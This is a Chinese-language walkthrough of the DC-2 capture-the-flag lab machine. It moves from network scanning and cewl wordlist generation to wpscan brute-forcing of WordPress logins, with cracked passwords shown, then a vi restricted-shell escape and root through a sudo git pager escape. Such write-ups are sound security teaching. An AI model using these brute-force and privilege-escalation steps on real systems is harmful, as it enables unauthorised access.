### 扫描地址
```zsh
┌──(kali㉿kali)-[~]
└─$ sudo arp-scan -l
[sudo] password for kali:
Interface: eth0, type: EN10MB, MAC: 00:0c:29:ae:51:81, IPv4: 192.168.7.128
WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.7.1     00:50:56:c0:00:08       (Unknown)
192.168.7.2     00:50:56:e4:2a:ab       (Unknown)
192.168.7.129   00:0c:29:9e:63:89       (Unknown)
192.168.7.254   00:50:56:e7:52:95       (Unknown)
```

### 得到地址后

```zsh
┌──(kali㉿kali)-[~]
└─$ nmap 192.168.7.129 -p 1-65535
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-05 09:19 EDT
Nmap scan report for 192.168.7.129
Host is up (0.00070s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
80/tcp   open  http
7744/tcp open  raqmon-pdu
MAC Address: 00:0C:29:9E:63:89 (VMware)
```

`80`端口发生``302``跳转 http://dc-2/
手动`hosts`添加后进入web
提示可以使用[[cewl]]
`7744` 不知道是啥
丢进浏览器也不是web

[[cewl]]是一个字典生成器，它从指定url读取字符串

```zsh
cewl http://dc-2/ >> 11.txt
```

### [[dirsearch]]

```zsh
dirsearch -u http://dc-2/
dirsearch -u 192.168.7.129
```

看到了wp

### 使用[[wpscan]]

### 枚举用户

```zsh
wpscan --url http://dc-2/ -e u
```

##### 几个用户名建txt丢进去

```
admin
jerry
tom
```

### 与[[cewl]]得到的字典组合

```zsh
wpscan --url http://dc-2/ -U user.txt -P 11.txt
```

```
[!] Valid Combinations Found:
 | Username: jerry, Password: adipiscing
 | Username: tom, Password: parturient
```

```
http://dc-2/wp-admin
```
### 登录后可以看到flag2


### 使用ssh登录tom

```zsh
ssh tom@192.168.7.129 -p 7744
```

### vi提权

```
vi
ESC
:set shell=/bin/bash
:shell
```
### 添加PATH使用更多命令

```zsh
export PATH=/bin:$PATH
```

```zsh
tom@DC-2:~$ su jerry
jerry@DC-2:/home/tom$ cd
jerry@DC-2:~$ ls
flag4.txt
```

得到`flag4`

```zsh
jerry@DC-2:~$ cat flag4.txt
Good to see that you've made it this far - but you're not home yet.

You still need to get the final flag (the only flag that really counts!!!).

No hints here - you're on your own now.  :-)

Go on - git outta here!!!!
```

### Git提权

```shell
jerry@DC-2:~$ sudo -l
Matching Defaults entries for jerry on DC-2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jerry may run the following commands on DC-2:
    (root) NOPASSWD: /usr/bin/git
jerry@DC-2:~$ sudo git
usage: git [--version] [--help] [-C <path>] [-c name=value]
           [--exec-path[=<path>]] [--html-path] [--man-path] [--info-path]
           [-p|--paginate|--no-pager] [--no-replace-objects] [--bare]
           [--git-dir=<path>] [--work-tree=<path>] [--namespace=<name>]
           <command> [<args>]
```

`sudo git`可以无密码使用

```shell
sudo git -p help
!/bin/bash
```

```
root@DC-2:/home/jerry# cd
root@DC-2:~# ls
final-flag.txt
root@DC-2:~# cat final-flag.txt
 __    __     _ _       _                    _
/ / /\ \ \___| | |   __| | ___  _ __   ___  / \
\ \/  \/ / _ \ | |  / _` |/ _ \| '_ \ / _ \/  /
 \  /\  /  __/ | | | (_| | (_) | | | |  __/\_/
  \/  \/ \___|_|_|  \__,_|\___/|_| |_|\___\/


Congratulatons!!!

A special thanks to all those who sent me tweets
and provided me with feedback - it's all greatly
appreciated.

If you enjoyed this CTF, send me a tweet via @DCAU7.
```